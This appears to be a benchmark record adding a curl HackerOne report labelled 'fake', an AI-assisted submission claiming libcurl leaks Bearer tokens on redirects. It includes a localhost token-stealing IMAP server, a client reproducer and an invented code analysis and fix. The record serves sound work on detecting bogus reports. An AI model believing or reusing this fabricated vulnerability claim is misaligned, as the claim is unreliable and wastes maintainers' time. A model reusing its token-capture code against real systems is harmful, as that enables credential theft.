@@ -1,0 +1,39 @@
+{
+  "case_id": "h1-3514263",
+  "commit": null,
+  "description": "Confirmed fake report from bagder/slop.md; HackerOne 3514263.",
+  "ground_truth": "fake",
+  "id": "h1-3514263",
+  "project": "curl",
+  "provenance": {
+    "commit_verified": null,
+    "fallback_reason": null,
+    "h1": {
+      "created_at": "2026-01-17T07:52:01.656Z",
+      "cve_ids": [
+        "CVE-2025-14524",
+        "CVE-2022-27774"
+      ],
+      "disclosed_at": "2026-01-17T15:14:17.223Z",
+      "id": 3514263,
+      "public": true,
+      "severity_rating": "low",
+      "state": "Closed",
+      "substate": "not-applicable",
+      "weakness": "Insufficiently Protected Credentials"
+    },
+    "label_source": "https://gist.github.com/bagder/07f7581f6e3d78ef37dfbfc81fd1d1cd",
+    "origin": "hackerone",
+    "ref_source": "unresolved",
+    "ref_verified": null,
+    "report_sha256": "f1f111b70a88c0e91a54654043dbc84c8ffe3c84301caa92143612bea9ceccb4"
+  },
+  "repo_url": "https://github.com/curl/curl",
+  "report": "libcurl: Improper Authentication State Management on Cross-Protocol Redirects\n\nFollowing the recent advisory for **CVE-2025-14524**, I conducted an investigation into how libcurl manages OAuth2 credentials during complex redirect chains. I have confirmed that while the library successfully protects traditional user credentials, it fails to clear OAuth2 Bearer tokens in the same way during cross-protocol or cross-origin redirects. This report provides a detailed analysis and a working reproduction of how an attacker can leverage this state-management flaw to exfiltrate valid Bearer tokens.\n\n**AI Statement**: This report was researched and generated with the assistance of an AI agent to analyze the libcurl source code and identify inconsistent state management logic. However, the vulnerability has been manually verified, the Proof of Concept code was compiled and executed locally, and the findings have been confirmed against a custom TCP server to ensure validity and reproducibility.\n\n## Vulnerability Description\n\nThe core issue is an inconsistency in libcurl's security boundary logic. When a request is redirected to a different host, port, or protocol, libcurl correctly invokes a \"clear\" operation on authentication state to prevent credential leakage (behavior hardened during the fix for CVE-2022-27774). However, my analysis shows that this clearing logic is incomplete as it only targets standard user/password fields.\n\nBecause the OAuth2 Bearer token (`CURLOPT_XOAUTH2_BEARER`) is stored separately in the handle's configuration, it survives the \"clear\" operation. When the transfer continues to the new destination, libcurl sees a valid Bearer token and automatically includes it in the new session's headers or SASL handshake.\n\n### Attack Scenario\n1. **Victim Initialization**: An application initiates a trusted request (e.g., to an internal API) with `CURLOPT_XOAUTH2_BEARER` set and `CURLOPT_FOLLOWLOCATION` enabled.\n2. **The Hook**: A malicious or compromised server returns a `301/302` redirect pointing to an attacker-controlled service using a different protocol (e.g., `imap://`).\n3. **The Leak**: libcurl follows the redirect. While it clears standard password credentials, the Bearer token remains. Upon connecting to the IMAP server, libcurl attempts SASL authentication and sends the token to the attacker.\n\n## Proof of Concept\n\nI have built a custom environment to demonstrate the leak. This consists of a multi-protocol listener and a standard libcurl client.\n\n### 1. Redirect & Stealer Server (`redirect_server.py`)\nThis script simulates the redirector and the credential-harvesting endpoint.\n\n```python\nimport socket\nimport threading\nimport re\nimport base64\n\ndef http_redirector():\n    host = '127.0.0.1'\n    port = 8080\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        s.bind((host, port))\n        s.listen(1)\n        print(f\"[HTTP] Redirector listening on {host}:{port}\")\n        conn, addr = s.accept()\n        with conn:\n            req = conn.recv(1024)\n            # Redirecting to IMAP to trigger SASL authentication\n            redirect = (\n                \"HTTP/1.1 301 Moved Permanently\\r\\n\"\n                \"Location: imap://victim@127.0.0.1:1430/\\r\\n\"\n                \"Content-Length: 0\\r\\n\\r\\n\"\n            )\n            conn.sendall(redirect.encode())\n            print(\"[HTTP] Sent 301 Redirect to imap://victim@127.0.0.1:1430/\")\n\ndef imap_stealer():\n    host = '127.0.0.1'\n    port = 1430\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        s.bind((host, port))\n        s.listen(1)\n        print(f\"[IMAP] Stealer listening on {host}:{port}\")\n        \n        conn, addr = s.accept()\n        with conn:\n            print(f\"[IMAP] Victim connected from {addr}\")\n            conn.sendall(b\"* OK [CAPABILITY IMAP4rev1 AUTH=XOAUTH2] Rogue Ready\\r\\n\")\n            \n            while True:\n                data = conn.recv(4096).decode('utf-8', 'ignore')\n                if not data: break\n                \n                if \"AUTHENTICATE XOAUTH2\" in data.upper():\n                    conn.sendall(b\"+\\r\\n\")\n                    token_data = conn.recv(4096).decode('utf-8', 'ignore')\n                    print(f\"\\n[!!!] CAPTURED BEARER TOKEN: {token_data.strip()}\\n\")\n                    break\n\nif __name__ == \"__main__\":\n    threading.Thread(target=http_redirector).start()\n    threading.Thread(target=imap_stealer).start()\n```\n\n### 2. Client Reproduction Code (`client_reproduce.c`)\n```c\n#include <stdio.h>\n#include <curl/curl.h>\n\nint main(void) {\n    CURL *curl;\n    const char *secret_token = \"TOP_SECRET_SESSION_TOKEN\";\n\n    curl_global_init(CURL_GLOBAL_ALL);\n    curl = curl_easy_init();\n\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, \"http://127.0.0.1:8080/initial_request\");\n        curl_easy_setopt(curl, CURLOPT_XOAUTH2_BEARER, secret_token);\n        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);\n        curl_easy_setopt(curl, CURLOPT_REDIR_PROTOCOLS_STR, \"http,https,imap\");\n        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n\n        printf(\"[*] Executing transfer with Bearer token...\\n\");\n        curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n    return 0;\n}\n```\n\n### Steps to Reproduce\n1. Start the server: `python redirect_server.py`\n2. Compile and run the client: `gcc client_reproduce.c -o repro -lcurl && ./repro`\n3. Check the server logs. You will see the captured token in base64 format.\n\n---\n\n## Vulnerable Code Analysis\nThe root cause is located in `lib/http.c`. When a redirect requires clearing credentials, the code only targets standard fields:\n\n```c\n/* Location: lib/http.c */\nif(clear) {\n    Curl_safefree(data->state.aptr.user);\n    Curl_safefree(data->state.aptr.passwd);\n    /* VULNERABILITY: OAuth2 Bearer token is not cleared here */\n}\n```\n\n### Technical Recommendation\nTo address this, the Bearer token must be explicitly cleared alongside the username and password when a security boundary is crossed:\n\n```c\nif(clear) {\n    Curl_safefree(data->state.aptr.user);\n    Curl_safefree(data->state.aptr.passwd);\n    /* Recommended Fix */\n    Curl_setstropt(&data->set.str[STRING_BEARER], NULL); \n}\n```\n\n## Impact\n\n1. **Credential Exfiltration**: Valid, high-privilege Bearer tokens are leaked to unauthorized external servers.",
+  "report_id": "h1-3514263",
+  "reported_version": null,
+  "source": "hackerone",
+  "source_url": "https://hackerone.com/reports/3514263",
+  "tag": null,
+  "title": "libcurl: Improper Authentication State Management on Cross-Protocol Redirects"
+}
